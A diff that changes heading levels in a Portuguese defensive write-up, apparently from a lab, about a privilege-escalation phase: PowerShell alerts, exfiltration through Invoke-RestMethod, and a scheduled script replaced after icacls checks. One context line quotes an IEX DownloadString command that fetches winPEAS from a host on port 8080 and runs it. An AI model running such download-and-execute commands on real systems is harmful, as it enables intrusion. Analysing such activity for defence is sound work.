@@ -1033,12 +1033,12 @@ Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte d
 <br/>
 <br/>
 
-#  Fase 2 — Escalada de Privilégios
+##  Fase 2 — Escalada de Privilégios
 
 <br/>
 <br/>
 
-##  Alertas Gerados
+###  Alertas Gerados
 
 <p align="center">
 <br/>
@@ -1056,7 +1056,7 @@ Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte d
 <br/>
 <br/>
 
-###  Padrões identificados:
+####  Padrões identificados:
 - Utilização de **PowerShell para executar comandos remotamente**.
 - **Exfiltração de dados** usando `Invoke-RestMethod`.
 - Comunicação com um servidor de controlo na porta **8080**, usada para upload e download de scripts e resultados.
@@ -1073,7 +1073,7 @@ Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte d
 <br/>
 <br/>
 
-##  1. Transferência de Script PowerShell via HTTP (winPEAS)
+###  1. Transferência de Script PowerShell via HTTP (winPEAS)
 
 <p align="center">
 <br/>
@@ -1093,7 +1093,7 @@ Estes dados permitiriam uma **ação de resposta imediata e eficaz** por parte d
 <br/>
 <br/>
 
-### Detalhes do Comportamento
+#### Detalhes do Comportamento
 
 - **Processo responsável**: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`
 - **Comando executado**:
@@ -1109,7 +1109,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.205:8080/winPEAS
 <br/>
 <br/>
 
-### 🔍 Interpretação Defensiva
+#### 🔍 Interpretação Defensiva
 
 Este conjunto de eventos mostra um **comportamento clássico de pós-exploração**, onde o atacante utiliza o PowerShell para descarregar ferramentas auxiliares como o **winPEAS**, com o intuito de **enumerar o sistema local** e identificar potenciais vetores de escalada de privilégios, neste caso para escapar ao Windows defender foi descarregado um script para enumeração simples sendo assim evasiva.
 
@@ -1120,7 +1120,7 @@ O uso da função `IEX` (Invoke-Expression), aliado ao `DownloadString`, constit
 <br/>
 <br/>
 
-##  2. Exfiltração de Dados via `Invoke-RestMethod`
+###  2. Exfiltração de Dados via `Invoke-RestMethod`
 
 <p align="center">
 <br/>
@@ -1164,7 +1164,7 @@ A exfiltração é realizada após a execução do script de enumeração, e dem
 <br/>
 <br/>
 
-##  3. Verificação de Permissões e Substituição Maliciosa de Script Agendado
+###  3. Verificação de Permissões e Substituição Maliciosa de Script Agendado
 
 <br/>
 <br/>
@@ -1174,7 +1174,7 @@ O próximo conjunto de alertas revela um comportamento ofensivo associado à **e
 <br/>
 <br/>
 
-### 🛠 Alerta 1: Execução de `icacls.exe`
+#### 🛠 Alerta 1: Execução de `icacls.exe`
 
 <p align="center">
 <br/>
@@ -1199,7 +1199,7 @@ O próximo conjunto de alertas revela um comportamento ofensivo associado à **e
 <br/>
 <br/>
 
-### 🛠 Alerta 2: `Invoke-WebRequest` com Substituição do Script!
+#### 🛠 Alerta 2: `Invoke-WebRequest` com Substituição do Script!
 
 <p align="center">
 <br/>
@@ -1235,7 +1235,7 @@ O atacante validou permissões com `icacls` e, ao confirmar fragilidades, usou `
 <br/>
 <br/>
 
-## ✅ **Conclusão da Fase 2**
+### ✅ **Conclusão da Fase 2**
 
 <br/>
 <br/>
